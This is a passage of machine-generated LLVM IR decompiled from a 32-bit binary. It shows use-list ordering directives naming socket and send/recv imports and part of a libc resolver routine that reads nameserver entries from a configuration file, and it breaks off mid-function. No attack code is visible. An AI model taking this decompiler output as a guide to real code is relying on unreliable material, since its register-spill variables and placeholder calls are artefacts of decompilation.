  uselistorder i16 %stack_var_-192.1, { 1, 0 }
  uselistorder i32 %v0_8052f48.pre, { 1, 0 }
  uselistorder i32 %v5_8052f1b, { 1, 0 }
  uselistorder i32 %v3_8052f1b, { 2, 0, 1, 3 }
  uselistorder i32 %v1_8052ee3, { 0, 5, 4, 3, 2, 1, 6 }
  uselistorder i32 %v0_8052eac, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8052e7a, { 1, 0 }
  uselistorder i32 %v3_8052e59, { 1, 0, 2 }
  uselistorder i32 %v0_8052e4a, { 1, 0 }
  uselistorder i32 %v5_8052e40, { 1, 0 }
  uselistorder i32* %v3_8052e40, { 1, 0 }
  uselistorder i32 %v0_8052d1681, { 0, 1, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_8052e40, { 2, 1, 0 }
  uselistorder i32 %v5_8052e3a, { 1, 0 }
  uselistorder i32 %v1_8052e39, { 2, 1, 0, 3 }
  uselistorder i32 %v1_8052e35, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8052df9, { 0, 6, 1, 2, 3, 4, 5, 7, 8, 9 }
  uselistorder i32 %v7_8052dd3, { 1, 0 }
  uselistorder i32 %v1_8052dc4, { 1, 0 }
  uselistorder i32 %v0_8052d83, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v1_8052d2a, { 1, 2, 0 }
  uselistorder i32 %v0_8052d2a, { 4, 1, 2, 3, 0, 5 }
  uselistorder i32 %v5_8052d04, { 1, 0 }
  uselistorder i32 %v1_8052cfe, { 2, 1, 0, 3 }
  uselistorder i32 %v0_8052cf9, { 1, 2, 0 }
  uselistorder i32 %v5_8052d0458, { 1, 0 }
  uselistorder i32 %v5_8052ca6, { 1, 0 }
  uselistorder i32 %v3_8052ca6, { 2, 0, 1, 3 }
  uselistorder i32 %v3_8052c5e, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8052c44, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v0_8052c44, { 0, 1, 9, 2, 3, 4, 5, 6, 7, 8, 10, 11 }
  uselistorder i32 %v0_8052c23, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_8052c03, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_8052ba9, { 4, 0, 1, 2, 3 }
  uselistorder i32 %v0_8052b8e, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 %v1_8052b77, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_8052aff, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8052aec, { 3, 0, 1, 2 }
  uselistorder i32 %v1_8052ab2, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_8052a93, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_8052a77, { 1, 0 }
  uselistorder i32 %v3_8052a6c, { 2, 3, 0, 1, 5, 4, 6 }
  uselistorder i32 %v0_8052a69, { 4, 0, 1, 2, 3, 5, 6 }
  uselistorder i32 %v0_8052a0e, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 %v0_8052a09, { 0, 2, 1, 3 }
  uselistorder i32 %v1_80529f2, { 1, 0 }
  uselistorder i32 %v1_80529be, { 3, 2, 1, 0 }
  uselistorder i32 %v0_80529af92, { 2, 1, 0 }
  uselistorder i32 %v3_80529c7, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i16 %v0_805296f, { 4, 5, 0, 1, 2, 3, 6 }
  uselistorder i32 %v15_8052968, { 6, 7, 4, 5, 3, 2, 0, 1, 8, 9, 10, 11, 13, 14, 15, 16, 17, 12 }
  uselistorder i32 %v2_80528da, { 1, 7, 2, 10, 9, 8, 3, 11, 0, 4, 5, 6, 12, 13 }
  uselistorder i8** %stack_var_-252, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %edx.global-to-local, { 16, 17, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i32* %eax.global-to-local, { 81, 82, 83, 84, 0, 1, 2, 3, 74, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 62, 58, 59, 60, 61, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 75, 76, 77, 78, 79, 80 }
  uselistorder i32 51, { 1, 0 }
  uselistorder i32 160, { 0, 3, 1, 2 }
  uselistorder i32 68, { 5, 0, 2, 3, 4, 1 }
  uselistorder i32 27, { 1, 2, 0 }
  uselistorder i32 112, { 0, 4, 5, 6, 2, 3, 1 }
  uselistorder i32 72, { 1, 2, 3, 0, 4 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_recv, { 4, 3, 2, 1, 0 }
  uselistorder i32 228, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_send, { 4, 5, 12, 11, 10, 9, 8, 7, 6, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_connect, { 2, 4, 3, 5, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @socket, { 1, 7, 6, 5, 4, 3, 2, 8, 0 }
  uselistorder i32 17, { 13, 11, 9, 10, 4, 5, 3, 0, 14, 8, 2, 1, 12, 6, 7 }
  uselistorder i32 176, { 3, 1, 2, 0 }
  uselistorder i32 (i32)* @inet_addr, { 2, 3, 1, 0 }
  uselistorder i32 ptrtoint (i32* @0 to i32), { 3, 4, 0, 1, 2, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 17, 18, 19, 16, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 53, 54, 51, 52, 55, 56 }
  uselistorder i32 224, { 0, 2, 1 }
  uselistorder i32 220, { 1, 2, 0 }
  uselistorder i32 260, { 2, 1, 0, 3 }
  uselistorder i32 184, { 2, 0, 1 }
  uselistorder i32 ()* @__GI_strncat, { 1, 0 }
  uselistorder i32 268, { 1, 0 }
  uselistorder i32 200, { 1, 0, 2, 3 }
  uselistorder i32 (i8*, i32, i32)* @strncpy, { 1, 2, 3, 0 }
  uselistorder i32 104, { 2, 0, 3, 1 }
  uselistorder i32 116, { 2, 4, 0, 1, 5, 3 }
  uselistorder i32 84, { 4, 0, 5, 1, 3, 2 }
  uselistorder i32 -12, { 9, 3, 2, 4, 1, 5, 6, 7, 8, 10, 50, 49, 48, 16, 17, 11, 12, 13, 14, 15, 18, 19, 0, 20, 51, 26, 23, 21, 22, 24, 25, 30, 31, 32, 28, 27, 29, 33, 39, 40, 38, 37, 36, 34, 35, 41, 42, 43, 44, 45, 46, 47 }
  uselistorder i32 -8, { 10, 4, 3, 5, 2, 6, 7, 8, 9, 11, 49, 44, 47, 45, 48, 50, 51, 46, 17, 18, 12, 13, 14, 15, 16, 19, 20, 21, 22, 24, 0, 23, 1, 26, 27, 25, 28, 29, 30, 31, 36, 37, 35, 34, 33, 32, 38, 39, 40, 41, 42, 43 }
  uselistorder i32 (i32)* @__libc_close, { 13, 12, 11, 15, 19, 18, 14, 17, 16, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 -16, { 27, 28, 29, 18, 20, 21, 17, 19, 16, 22, 15, 23, 24, 25, 26, 30, 96, 97, 36, 37, 31, 32, 33, 34, 35, 38, 39, 14, 40, 41, 52, 48, 45, 46, 47, 49, 3, 1, 2, 4, 5, 50, 44, 6, 51, 42, 43, 0, 53, 54, 59, 60, 61, 62, 63, 58, 56, 55, 57, 7, 64, 8, 9, 67, 68, 69, 66, 70, 71, 65, 72, 10, 11, 85, 86, 87, 82, 83, 84, 81, 80, 79, 78, 77, 73, 74, 75, 76, 88, 12, 13, 89, 90, 91, 92, 93, 94, 95 }
  uselistorder i16* @global_var_805a124.280, { 2, 1, 0 }
  uselistorder i64 4294967295, { 1, 2, 0, 3 }
  uselistorder i64* @global_var_80603e0.279, { 2, 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_80603c8.278 to i32), { 4, 3, 2, 1, 0 }
  uselistorder i8** @global_var_80603c8.278, { 1, 0 }
  uselistorder i32 1025, { 5, 6, 7, 1, 2, 0, 4, 3 }
  uselistorder i32 512, { 6, 3, 7, 8, 4, 5, 0, 1, 2 }
  uselistorder i8* %arg1, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8053009, { 1, 0 }
  uselistorder label %dec_label_pc_8053006, { 1, 0 }
  uselistorder label %dec_label_pc_8052f96, { 1, 0 }
  uselistorder label %dec_label_pc_8052f80, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052f6d, { 3, 2, 1, 0, 7, 6, 5, 4 }
  uselistorder label %dec_label_pc_8052f48.backedge, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_8052f40, { 1, 0 }
  uselistorder label %dec_label_pc_8052f27, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_8052edc, { 6, 1, 2, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_8052e7a, { 1, 0 }
  uselistorder label %dec_label_pc_8052e4a, { 5, 2, 6, 4, 3, 0, 1 }
  uselistorder label %dec_label_pc_8052e40, { 1, 0 }
  uselistorder label %dec_label_pc_8052e35, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052e32, { 1, 0 }
  uselistorder label %dec_label_pc_8052dad, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8052cf5, { 1, 0 }
  uselistorder label %dec_label_pc_8052b77, { 1, 0 }
  uselistorder label %dec_label_pc_8052b40, { 1, 0 }
  uselistorder label %dec_label_pc_8052ab2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80529be, { 1, 0 }
  uselistorder label %dec_label_pc_80529a8, { 1, 0 }
}

define i32 @__open_nameservers() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %v0_8053018 = load i32, i32* @ebp, align 4
  store i32 134550911, i32* %stack_var_-216, align 4
  %v3_8053027 = ptrtoint i32* %stack_var_-216 to i32
  %v2_805302c = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_805302c, i32* @eax, align 4
  %v2_8053034 = call i32 @__pthread_return_void(i32 %v2_805302c, i32 134550911)
  %v1_8053040 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805a128.220 to i32))
  store i32 %v1_8053040, i32* @eax, align 4
  %v0_8053048 = load i32, i32* @global_var_8060814.221, align 4
  %tmp43 = icmp slt i32 %v0_8053048, 1
  %tmp44 = icmp eq i1 %tmp43, false
  br i1 %tmp44, label %dec_label_pc_805323f, label %dec_label_pc_8053055

dec_label_pc_8053055:                             ; preds = %entry
  store i32 ptrtoint (i32* @global_var_8058090.283 to i32), i32* %stack_var_-216, align 4
  %v2_8053061 = call i32 @__GI_fopen(i32 ptrtoint ([17 x i8]* @global_var_805805e.284 to i32), i32 ptrtoint (i32* @global_var_8058090.283 to i32))
  store i32 %v2_8053061, i32* @eax, align 4
  store i32 %v2_8053061, i32* @ebp, align 4
  %v1_805306b = icmp eq i32 %v2_8053061, 0
  %v1_805306d = icmp eq i1 %v1_805306b, false
  br i1 %v1_805306d, label %dec_label_pc_805320a.preheader, label %dec_label_pc_8053073

dec_label_pc_8053073:                             ; preds = %dec_label_pc_8053055
  store i32 ptrtoint (i32* @global_var_8058090.283 to i32), i32* %stack_var_-216, align 4
  %v2_805307f = call i32 @__GI_fopen(i32 ptrtoint ([24 x i8]* @global_var_805806f.285 to i32), i32 ptrtoint (i32* @global_var_8058090.283 to i32))
  store i32 %v2_805307f, i32* @ebp, align 4
  %v1_8053089 = icmp eq i32 %v2_805307f, 0
  %v1_805308b = icmp eq i1 %v1_8053089, false
  br i1 %v1_805308b, label %dec_label_pc_805320a.preheader, label %dec_label_pc_8053234

dec_label_pc_805320a.preheader:                   ; preds = %dec_label_pc_8053055, %dec_label_pc_8053073
  %v2_8053211 = ptrtoint i32* %stack_var_-180 to i32
  %v3_8053145 = add i32 %v3_8053027, 164
  %v0_805320a103 = load i32, i32* @edx, align 4
  store i32 128, i32* %stack_var_-216, align 4
  store i32 %v2_8053211, i32* @ebx, align 4
  %v3_8053216104 = call i32 @fgets(i32 %v2_8053211, i32 128, i32 %v0_805320a103)
  store i32 %v3_8053216104, i32* @eax, align 4
  %v1_805321e105 = icmp eq i32 %v3_8053216104, 0
  %v1_8053220106 = icmp eq i1 %v1_805321e105, false
  br i1 %v1_8053220106, label %dec_label_pc_8053097.preheader.lr.ph, label %dec_label_pc_8053226

dec_label_pc_8053097.preheader.lr.ph:             ; preds = %dec_label_pc_805320a.preheader
  %v4_805312f = inttoptr i32 %tmp to i8*
  br label %dec_label_pc_8053097.preheader

dec_label_pc_8053096:                             ; preds = %dec_label_pc_80530a1
  %v1_8053096 = add i32 %v0_805309657, 1
  store i32 %v1_8053096, i32* @ebx, align 4
  %v1_8053097 = inttoptr i32 %v1_8053096 to i8*
  %v2_8053097 = load i8, i8* %v1_8053097, align 1
  %v3_8053097 = zext i8 %v2_8053097 to i32
  %v5_8053097 = and i32 %v6_805309760, -256
  %v6_8053097 = or i32 %v3_8053097, %v5_8053097
  store i32 %v6_8053097, i32* @ecx, align 4
  %v4_8053099 = icmp eq i8 %v2_8053097, 0
  br i1 %v4_8053099, label %dec_label_pc_805320a.backedge, label %dec_label_pc_80530a1

dec_label_pc_80530a1:                             ; preds = %dec_label_pc_80530a1.lr.ph, %dec_label_pc_8053096
  %v6_805309760 = phi i32 [ %v6_805309755, %dec_label_pc_80530a1.lr.ph ], [ %v6_8053097, %dec_label_pc_8053096 ]
  %v2_805309759 = phi i8 [ %v2_805309752, %dec_label_pc_80530a1.lr.ph ], [ %v2_8053097, %dec_label_pc_8053096 ]
  %v1_805309758 = phi i8* [ %v1_805309751, %dec_label_pc_80530a1.lr.ph ], [ %v1_8053097, %dec_label_pc_8053096 ]
  %v0_805309657 = phi i32 [ %v0_8053097.pre, %dec_label_pc_80530a1.lr.ph ], [ %v1_8053096, %dec_label_pc_8053096 ]
  %v2_80530a1 = sext i8 %v2_805309759 to i32
  store i32 %v2_80530a1, i32* @edx, align 4
  store i32 %v0_80530a4.pre, i32* @eax, align 4
  %v2_80530a9 = mul nsw i32 %v2_80530a1, 2
  %v3_80530a9 = add i32 %v0_80530a4.pre, %v2_80530a9
  %v4_80530a9 = inttoptr i32 %v3_80530a9 to i8*
  %v5_80530a9 = load i8, i8* %v4_80530a9, align 1
  %v6_80530a9 = and i8 %v5_80530a9, 32
  %v7_80530a9 = icmp eq i8 %v6_80530a9, 0
  %v1_80530ad = icmp eq i1 %v7_80530a9, false
  br i1 %v1_80530ad, label %dec_label_pc_8053096, label %dec_label_pc_80530af

dec_label_pc_80530af:                             ; preds = %dec_label_pc_80530a1
  %v10_80530af = icmp eq i8 %v2_805309759, 10
  br i1 %v10_80530af, label %dec_label_pc_805320a.backedge, label %dec_label_pc_80530b8

dec_label_pc_805320a.backedge:                    ; preds = %dec_label_pc_8053097.preheader, %dec_label_pc_8053096, %dec_label_pc_80531d0, %dec_label_pc_80531ff, %dec_label_pc_80531d7, %dec_label_pc_80530af, %dec_label_pc_80530b8, %dec_label_pc_8053189
  %v0_805320a = load i32, i32* @edx, align 4
  store i32 128, i32* %stack_var_-216, align 4
  store i32 %v2_8053211, i32* @ebx, align 4
  %v3_8053216 = call i32 @fgets(i32 %v2_8053211, i32 128, i32 %v0_805320a)
  store i32 %v3_8053216, i32* @eax, align 4
  %v1_805321e = icmp eq i32 %v3_8053216, 0
  %v1_8053220 = icmp eq i1 %v1_805321e, false
  br i1 %v1_8053220, label %dec_label_pc_8053097.preheader, label %dec_label_pc_8053226

dec_label_pc_80530b8:                             ; preds = %dec_label_pc_80530af
  %v10_80530c0 = icmp eq i8 %v2_805309759, 35
  %v1_80530c3 = icmp eq i1 %v10_80530c0, false
  br i1 %v1_80530c3, label %dec_label_pc_8053114.preheader, label %dec_label_pc_805320a.backedge

dec_label_pc_8053114.preheader:                   ; preds = %dec_label_pc_80530b8
  %v2_80531146 = load i8, i8* %v1_805309758, align 1
  %v3_80531147 = icmp eq i8 %v2_80531146, 0
  br i1 %v3_80531147, label %dec_label_pc_8053120, label %dec_label_pc_8053119

dec_label_pc_80530ca:                             ; preds = %dec_label_pc_8053119
  store i32 %stack_var_-196.013, i32* @eax, align 4
  %v1_80530ce = load i32, i32* @esp, align 4
  %v3_80530ce = mul nuw nsw i32 %stack_var_-196.013, 4
  %v4_80530ce = add nuw nsw i32 %v3_80530ce, 152
  %v5_80530ce = add i32 %v4_80530ce, %v1_80530ce
  %v6_80530ce = inttoptr i32 %v5_80530ce to i32*
  store i32 %v0_80530ce, i32* %v6_80530ce, align 4
  %v0_80530d8.pre = load i32, i32* @ebx, align 4
  %v4_80530d8.pre = load i32, i32* @ecx, align 4
  %v1_80530d861 = inttoptr i32 %v0_80530d8.pre to i8*
  %v2_80530d862 = load i8, i8* %v1_80530d861, align 1
  %v3_80530d863 = zext i8 %v2_80530d862 to i32
  %v5_80530d864 = and i32 %v4_80530d8.pre, -256
  %v6_80530d865 = or i32 %v3_80530d863, %v5_80530d864
  %v4_80530da66 = icmp eq i8 %v2_80530d862, 0
  br i1 %v4_80530da66, label %dec_label_pc_80530f7.preheader, label %dec_label_pc_80530de.lr.ph

dec_label_pc_80530de.lr.ph:                       ; preds = %dec_label_pc_80530ca
  %v0_80530e1.pre = load i32, i32* @global_var_8059eb8, align 8
  br label %dec_label_pc_80530de

dec_label_pc_80530d7:                             ; preds = %dec_label_pc_80530ec
  %v1_80530d7 = add i32 %v0_80530d767, 1
  store i32 %v1_80530d7, i32* @ebx, align 4
  %v1_80530d8 = inttoptr i32 %v1_80530d7 to i8*
  %v2_80530d8 = load i8, i8* %v1_80530d8, align 1
  %v3_80530d8 = zext i8 %v2_80530d8 to i32
  %v5_80530d8 = and i32 %v6_80530d869, -256
  %v6_80530d8 = or i32 %v3_80530d8, %v5_80530d8
  %v4_80530da = icmp eq i8 %v2_80530d8, 0
  br i1 %v4_80530da, label %dec_label_pc_80530f7.preheader, label %dec_label_pc_80530de

dec_label_pc_80530de:                             ; preds = %dec_label_pc_80530de.lr.ph, %dec_label_pc_80530d7
  %v6_80530d869 = phi i32 [ %v6_80530d865, %dec_label_pc_80530de.lr.ph ], [ %v6_80530d8, %dec_label_pc_80530d7 ]
  %v2_80530d868 = phi i8 [ %v2_80530d862, %dec_label_pc_80530de.lr.ph ], [ %v2_80530d8, %dec_label_pc_80530d7 ]
  %v0_80530d767 = phi i32 [ %v0_80530d8.pre, %dec_label_pc_80530de.lr.ph ], [ %v1_80530d7, %dec_label_pc_80530d7 ]
  %v2_80530de = sext i8 %v2_80530d868 to i32
  store i32 %v2_80530de, i32* @edx, align 4
  store i32 %v0_80530e1.pre, i32* @eax, align 4
  %v2_80530e6 = mul nsw i32 %v2_80530de, 2
  %v3_80530e6 = add i32 %v0_80530e1.pre, %v2_80530e6
  %v4_80530e6 = inttoptr i32 %v3_80530e6 to i8*
  %v5_80530e6 = load i8, i8* %v4_80530e6, align 1
  %v6_80530e6 = and i8 %v5_80530e6, 32
  %v7_80530e6 = icmp eq i8 %v6_80530e6, 0
  %v1_80530ea = icmp eq i1 %v7_80530e6, false
  br i1 %v1_80530ea, label %dec_label_pc_80530f7.preheader, label %dec_label_pc_80530ec

dec_label_pc_80530ec:                             ; preds = %dec_label_pc_80530de
  %v10_80530ec = icmp eq i8 %v2_80530d868, 10
  %v1_80530ef = icmp eq i1 %v10_80530ec, false
  br i1 %v1_80530ef, label %dec_label_pc_80530d7, label %dec_label_pc_80530f7.preheader

dec_label_pc_80530f7.preheader:                   ; preds = %dec_label_pc_80530ec, %dec_label_pc_80530de, %dec_label_pc_80530d7, %dec_label_pc_80530ca
  %v0_80530d7.lcssa = phi i32 [ %v0_80530d8.pre, %dec_label_pc_80530ca ], [ %v1_80530d7, %dec_label_pc_80530d7 ], [ %v0_80530d767, %dec_label_pc_80530de ], [ %v0_80530d767, %dec_label_pc_80530ec ]
  %v6_80530d8.lcssa = phi i32 [ %v6_80530d865, %dec_label_pc_80530ca ], [ %v6_80530d8, %dec_label_pc_80530d7 ], [ %v6_80530d869, %dec_label_pc_80530de ], [ %v6_80530d869, %dec_label_pc_80530ec ]
  %v1_80530f775 = inttoptr i32 %v0_80530d7.lcssa to i8*
  %v2_80530f776 = load i8, i8* %v1_80530f775, align 1
  %v3_80530f777 = zext i8 %v2_80530f776 to i32
  %v5_80530f778 = and i32 %v6_80530d8.lcssa, -256
  %v6_80530f779 = or i32 %v3_80530f777, %v5_80530f778
  store i32 %v6_80530f779, i32* @ecx, align 4
  %v4_80530f980 = icmp eq i8 %v2_80530f776, 0
  br i1 %v4_80530f980, label %dec_label_pc_8053110, label %dec_label_pc_80530fd

dec_label_pc_80530f3:                             ; preds = %dec_label_pc_805310b, %dec_label_pc_80530fd
  store i8 0, i8* %v1_80530f782, align 1
  %v0_80530f6 = load i32, i32* @ebx, align 4
  %v1_80530f6 = add i32 %v0_80530f6, 1
  store i32 %v1_80530f6, i32* @ebx, align 4
  %v4_80530f7.pre = load i32, i32* @ecx, align 4
  %v1_80530f7 = inttoptr i32 %v1_80530f6 to i8*
  %v2_80530f7 = load i8, i8* %v1_80530f7, align 1
  %v3_80530f7 = zext i8 %v2_80530f7 to i32
  %v5_80530f7 = and i32 %v4_80530f7.pre, -256
  %v6_80530f7 = or i32 %v3_80530f7, %v5_80530f7
  store i32 %v6_80530f7, i32* @ecx, align 4
  %v4_80530f9 = icmp eq i8 %v2_80530f7, 0
  br i1 %v4_80530f9, label %dec_label_pc_8053110, label %dec_label_pc_80530fd

dec_label_pc_80530fd:                             ; preds = %dec_label_pc_80530f7.preheader, %dec_label_pc_80530f3
  %v2_80530f783 = phi i8 [ %v2_80530f7, %dec_label_pc_80530f3 ], [ %v2_80530f776, %dec_label_pc_80530f7.preheader ]
  %v1_80530f782 = phi i8* [ %v1_80530f7, %dec_label_pc_80530f3 ], [ %v1_80530f775, %dec_label_pc_80530f7.preheader ]
  %v0_805311481 = phi i32 [ %v1_80530f6, %dec_label_pc_80530f3 ], [ %v0_80530d7.lcssa, %dec_label_pc_80530f7.preheader ]
  %v2_80530fd = sext i8 %v2_80530f783 to i32
  store i32 %v2_80530fd, i32* @edx, align 4
  %v0_8053100 = load i32, i32* @global_var_8059eb8, align 8
  store i32 %v0_8053100, i32* @eax, align 4
  %v2_8053105 = mul nsw i32 %v2_80530fd, 2
  %v3_8053105 = add i32 %v0_8053100, %v2_8053105
  %v4_8053105 = inttoptr i32 %v3_8053105 to i8*
  %v5_8053105 = load i8, i8* %v4_8053105, align 1
  %v6_8053105 = and i8 %v5_8053105, 32
  %v7_8053105 = icmp eq i8 %v6_8053105, 0
  %v1_8053109 = icmp eq i1 %v7_8053105, false
  br i1 %v1_8053109, label %dec_label_pc_80530f3, label %dec_label_pc_805310b

dec_label_pc_805310b:                             ; preds = %dec_label_pc_80530fd
  %v10_805310b = icmp eq i8 %v2_80530f783, 10
  br i1 %v10_805310b, label %dec_label_pc_80530f3, label %dec_label_pc_8053110

dec_label_pc_8053110:                             ; preds = %dec_label_pc_80530f3, %dec_label_pc_805310b, %dec_label_pc_80530f7.preheader
  %v0_8053114.lcssa = phi i32 [ %v0_80530d7.lcssa, %dec_label_pc_80530f7.preheader ], [ %v0_805311481, %dec_label_pc_805310b ], [ %v1_80530f6, %dec_label_pc_80530f3 ]
  %v1_80530f7.lcssa = phi i8* [ %v1_80530f775, %dec_label_pc_80530f7.preheader ], [ %v1_80530f782, %dec_label_pc_805310b ], [ %v1_80530f7, %dec_label_pc_80530f3 ]
  %v4_8053110 = add nuw nsw i32 %stack_var_-196.013, 1
  %v2_8053114 = load i8, i8* %v1_80530f7.lcssa, align 1
  %v3_8053114 = icmp eq i8 %v2_8053114, 0
  br i1 %v3_8053114, label %dec_label_pc_8053120, label %dec_label_pc_8053119

dec_label_pc_8053119:                             ; preds = %dec_label_pc_8053114.preheader, %dec_label_pc_8053110
  %v0_80530ce = phi i32 [ %v0_8053114.lcssa, %dec_label_pc_8053110 ], [ %v0_805309657, %dec_label_pc_8053114.preheader ]
  %stack_var_-196.013 = phi i32 [ %v4_8053110, %dec_label_pc_8053110 ], [ 0, %dec_label_pc_8053114.preheader ]
  %v7_805311e = icmp sgt i32 %stack_var_-196.013, 4
  br i1 %v7_805311e, label %dec_label_pc_8053120, label %dec_label_pc_80530ca

dec_label_pc_8053120:                             ; preds = %dec_label_pc_8053110, %dec_label_pc_8053119, %dec_label_pc_8053114.preheader
  %stack_var_-196.0.lcssa = phi i32 [ 0, %dec_label_pc_8053114.preheader ], [ %v4_8053110, %dec_label_pc_8053110 ], [ %stack_var_-196.013, %dec_label_pc_8053119 ]
  store i32 %tmp, i32* @edi, align 4
  %v0_8053127 = load i32, i32* @esi, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_8058087.286 to i32), i32* %stack_var_-216, align 4
  %v5_805312f = call i32 @__GI_strcoll(i8* %v4_805312f, i32 ptrtoint ([11 x i8]* @global_var_8058087.286 to i32), i32 %v0_8053127, i32 %v0_8053127)
  store i32 %v5_805312f, i32* @eax, align 4
  store i32 1, i32* @esi, align 4
  %v1_805313c = icmp eq i32 %v5_805312f, 0
  br i1 %v1_805313c, label %dec_label_pc_8053164.preheader, label %dec_label_pc_8053175

dec_label_pc_8053164.preheader:                   ; preds = %dec_label_pc_8053120
  %v5_805316890 = icmp sgt i32 %stack_var_-196.0.lcssa, 1
  br i1 %v5_805316890, label %dec_label_pc_805316a.lr.ph, label %dec_label_pc_8053175

dec_label_pc_805316a.lr.ph:                       ; preds = %dec_label_pc_8053164.preheader
  %v0_805316a.pre = load i32, i32* @global_var_8060814.221, align 4
  br label %dec_label_pc_805316a

dec_label_pc_8053142:                             ; preds = %dec_label_pc_805316a
  %v2_8053145 = mul i32 %v1_805314591, 4
  %v4_8053145 = add i32 %v2_8053145, %v3_8053145
  %v5_8053145 = inttoptr i32 %v4_8053145 to i32*
  %v6_8053145 = load i32, i32* %v5_8053145, align 4
  %v1_805314c = inttoptr i32 %v6_8053145 to i8*
  %v2_805314c = call i32 @__GI_strdup(i8* %v1_805314c)
  %v0_8053151 = load i32, i32* @esi, align 4
  %v1_8053151 = add i32 %v0_8053151, 1
  store i32 %v1_8053151, i32* @esi, align 4
  %v1_8053152 = load i32, i32* @ebx, align 4
  %v2_8053152 = mul i32 %v1_8053152, 4
  %v3_8053152 = add i32 %v2_8053152, 134613000
  %v4_8053152 = inttoptr i32 %v3_8053152 to i32*
  store i32 %v2_805314c, i32* %v4_8053152, align 4
  %v0_8053159 = load i32, i32* @ebx, align 4
  %v1_8053159 = add i32 %v0_8053159, 1
  store i32 %v1_8053159, i32* @eax, align 4
  store i32 %v1_8053159, i32* @global_var_8060814.221, align 4
  %v0_8053164.pre = load i32, i32* @esi, align 4
  %v5_8053168 = icmp slt i32 %v0_8053164.pre, %stack_var_-196.0.lcssa
  br i1 %v5_8053168, label %dec_label_pc_805316a, label %dec_label_pc_8053175

dec_label_pc_805316a:                             ; preds = %dec_label_pc_805316a.lr.ph, %dec_label_pc_8053142
  %v0_805316a = phi i32 [ %v0_805316a.pre, %dec_label_pc_805316a.lr.ph ], [ %v1_8053159, %dec_label_pc_8053142 ]
  %v1_805314591 = phi i32 [ 1, %dec_label_pc_805316a.lr.ph ], [ %v0_8053164.pre, %dec_label_pc_8053142 ]
  store i32 %v0_805316a, i32* @ebx, align 4
  %v7_8053173 = icmp sgt i32 %v0_805316a, 2
  br i1 %v7_8053173, label %dec_label_pc_8053175, label %dec_label_pc_8053142

dec_label_pc_8053175:                             ; preds = %dec_label_pc_8053164.preheader, %dec_label_pc_8053142, %dec_label_pc_805316a, %dec_label_pc_8053120
  %v0_8053175 = load i32, i32* @ebx, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_8058092.287 to i32), i32* %stack_var_-216, align 4
  %v0_805317c = load i32, i32* @edi, align 4
  %v4_805317d = inttoptr i32 %v0_805317c to i8*
  %v5_805317d = call i32 @__GI_strcoll(i8* %v4_805317d, i32 ptrtoint ([7 x i8]* @global_var_8058092.287 to i32), i32 %v0_8053175, i32 %v0_8053175)
  store i32 %v5_805317d, i32* @eax, align 4
  %v1_8053185 = icmp eq i32 %v5_805317d, 0
  br i1 %v1_8053185, label %dec_label_pc_80531c7.preheader, label %dec_label_pc_8053189

dec_label_pc_8053189:                             ; preds = %dec_label_pc_8053175
  %v0_8053189 = load i32, i32* @ecx, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_8058099.288 to i32), i32* %stack_var_-216, align 4
  %v0_8053190 = load i32, i32* @edi, align 4
  %v4_8053191 = inttoptr i32 %v0_8053190 to i8*
  %v5_8053191 = call i32 @__GI_strcoll(i8* %v4_8053191, i32 ptrtoint ([7 x i8]* @global_var_8058099.288 to i32), i32 %v0_8053189, i32 %v0_8053189)
  %v1_8053199 = icmp eq i32 %v5_8053191, 0
  br i1 %v1_8053199, label %dec_label_pc_80531c7.preheader, label %dec_label_pc_805320a.backedge

dec_label_pc_80531c7.preheader:                   ; preds = %dec_label_pc_8053175, %dec_label_pc_8053189
  %v0_80531c792 = load i32, i32* @global_var_8060818.281, align 8
  %tmp4594 = icmp slt i32 %v0_80531c792, 1
  %tmp4695 = icmp eq i1 %tmp4594, false
